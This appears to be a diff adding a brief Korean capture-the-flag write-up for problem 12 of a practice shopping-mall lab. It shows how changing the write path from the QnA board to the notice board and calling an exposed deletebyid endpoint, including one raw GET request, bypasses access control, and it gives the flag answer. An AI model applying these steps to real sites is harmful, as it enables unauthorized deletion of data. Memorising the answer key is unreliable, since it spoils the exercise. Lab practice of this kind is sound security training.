@@ -1,0 +1,16 @@
+================================
+* 쇼핑몰 문제 12번
+================================
+
+1. 풀이과정
+https://lab.eqst.co.kr:8110/practice/practice12/notice
+qna페이지에서 write되는것을 공지사항에서 write를 할수있게 바꿨을때 바뀜.
+
+https://lab.eqst.co.kr:8110/practice/practice12/qna/write
+https://lab.eqst.co.kr:8110/practice/practice12/notice/write
+https://lab.eqst.co.kr:8110/practice/practice12/notice/deletebyid?id=6337&page=0
+삭제가되는 deletebyid를 확인할수있고 그것을 통해 다시 삭제함.
+GET /practice/practice12/qna/deletebyid?id=16345 HTTP/1.1
+
+2.정답
+authority_and_authentication
